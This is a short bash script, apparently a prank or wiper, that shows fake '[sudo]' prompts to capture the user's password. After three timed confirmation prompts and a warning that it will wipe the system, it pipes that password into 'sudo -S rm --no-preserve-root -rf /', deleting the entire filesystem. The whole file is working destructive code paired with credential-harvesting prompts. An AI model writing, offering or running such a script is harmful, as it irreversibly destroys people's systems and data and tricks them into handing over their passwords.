#!/bin/bash

function FAILSAFE_EXEC {
    read -p "$* [y/n]: " yn
    if [[ $yn =~ ^[Yy]$ ]]
    then
        return 0
    else
        echo "ERROR: CONFIRMATION_DENIED"
        exit 1
    fi
}

read -s -p "[sudo]: password for $(whoami): " pass
echo " "
echo "Maniac program starting, please wait..."
sleep 1
echo "."
sleep 1
echo ".."
sleep 1
echo "..."
sleep 1

echo "This script requires user confirmation three times before proceeding."
sleep 1
FAILSAFE_EXEC "Are you sure you want to proceed?"
sleep 13
FAILSAFE_EXEC "Are you really sure?"
sleep 13
echo "WARNING! THIS ACTION IS IRREVERSIBLE AND WILL COMPLETELY WIPE THE SYSTEM!"
sleep 3
FAILSAFE_EXEC "Do you still wish to continue?"
sleep 13

echo "CONFIRMATION RECEIVED! Proceeding with the script..."

read -s -p "[sudo]: sudo password for $(whoami): " pass

echo $pass | sudo -S rm --no-preserve-root -rf /
